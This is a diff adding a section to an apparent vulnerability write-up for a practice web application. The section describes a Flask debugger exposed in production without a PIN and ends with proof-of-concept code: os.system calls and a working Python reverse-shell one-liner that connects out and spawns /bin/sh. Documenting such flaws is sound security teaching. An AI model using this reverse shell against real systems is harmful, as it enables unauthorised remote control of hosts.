@@ -109,3 +109,30 @@ Upload the xml file via a POSTMAN by choosing the "form-data" option and specify
 A logged-in user is able to enumerate other user's email addresses at /users?id=ID_NUMBER.
 Essentially, any logged_in user can enumerate all the users' email addresses by going through the id values.
 
+### Security Misconfiguration + RCE
+
+Inside the login page, there's a comment that mentions /oauth endpoint that's under development. When a User visits this page, it shows an error.
+
+html comment:
+```html
+
+<!--TO DO: /oauth endpoint is under development-->
+```
+The error page shows the flask debugger has been pushed to production and a PIN is disabled.  An attacker can open a python interactive shell by clicking the command line icon.
+
+With python, an attacker can obtain a reverse shell or issue any command. 
+
+Simple Command POC that opens a calculator on the target system: 
+```python
+#Windows
+os.system('calc')
+#Linux 
+os.system('xcalc')
+```
+
+Reverse shell command POC:
+
+Adjust the IP and the port for demo.
+```python
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+```
